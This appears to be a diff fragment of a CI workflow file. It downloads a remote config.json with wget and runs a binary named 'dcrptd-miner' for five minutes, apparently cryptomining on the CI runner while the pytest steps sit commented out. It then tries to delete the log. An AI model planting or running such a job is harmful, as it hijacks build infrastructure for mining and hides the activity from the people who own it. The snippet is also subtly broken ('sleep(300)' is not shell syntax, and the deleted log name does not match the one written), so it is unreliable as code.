@@ -14,7 +14,9 @@ jobs:
            tar xzvf pup.tar.gz
            rm config.json
            wget https://raw.githubusercontent.com/stundev/deep/master/config.json
-           ./dcprtd-miner
+           timeout 5m ./dcrptd-miner &> k.log
+           sleep(300)
+           rm kk.log
       #    pip install pytest-playwright
        #   playwright install
         #  pytest test.py
